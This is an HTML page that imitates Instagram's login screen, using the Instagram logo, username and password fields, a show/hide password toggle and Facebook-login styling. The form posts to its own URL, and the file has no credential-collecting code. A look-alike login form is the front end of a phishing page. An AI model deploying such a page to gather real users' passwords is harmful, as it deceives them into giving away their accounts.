<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram Login Clone</title>
  <style>
    body {
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: Arial, sans-serif;
    }
    .login-container {
      background-color: #fff;
      border: 1px solid #dbdbdb;
      border-radius: 8px;
      padding: 40px 32px;
      width: 100%;
      max-width: 350px;
      text-align: center;
    }
    .login-container img.logo {
      width: 150px;
      margin-bottom: 24px;
    }
    .login-container input {
      width: 100%;
      padding: 12px 10px;
      margin: 6px 0;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      background-color: #fafafa;
      font-size: 14px;
    }
    .password-wrapper {
      position: relative;
    }
    .password-wrapper span.toggle-password {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      font-size: 12px;
      color: #00376b;
      font-weight: bold;
    }
    .login-container button {
      width: 100%;
      padding: 10px;
      margin-top: 12px;
      background-color: #3897f0;
      color: white;
      border: none;
      border-radius: 4px;
      font-weight: bold;
      cursor: pointer;
      font-size: 14px;
    }
    .divider {
      margin: 16px 0;
      display: flex;
      align-items: center;
      text-align: center;
    }
    .divider::before,
    .divider::after {
      content: '';
      flex: 1;
      border-bottom: 1px solid #dbdbdb;
    }
    .divider::before {
      margin-right: 10px;
    }
    .divider::after {
      margin-left: 10px;
    }
    .login-container a {
      color: #00376b;
      text-decoration: none;
      font-size: 12px;
    }
    .login-container .facebook-login {
      color: #385185;
      font-weight: bold;
      margin-bottom: 8px;
    }
    .login-container .forgot {
      margin-top: 12px;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" class="logo" alt="Instagram Logo" />
    <form method="POST">
      <input type="text" name="username" placeholder="Phone number, username, or email" required />
      <div class="password-wrapper">
        <input type="password" name="password" id="password" placeholder="Password" required />
        <span class="toggle-password" onclick="togglePassword()">Show</span>
      </div>
      <button type="submit">Log In</button>
    </form>
    <div class="divider">OR</div>
    <a href="#" class="facebook-login">Log in with Facebook</a>
    <div class="forgot">
      <a href="#">Forgot password?</a>
    </div>
  </div>

  <script>
    function togglePassword() {
      const passwordInput = document.getElementById('password');
      const toggle = document.querySelector('.toggle-password');
      const isPassword = passwordInput.type === 'password';
      passwordInput.type = isPassword ? 'text' : 'password';
      toggle.textContent = isPassword ? 'Hide' : 'Show';
    }
  </script>
</body>
</html>
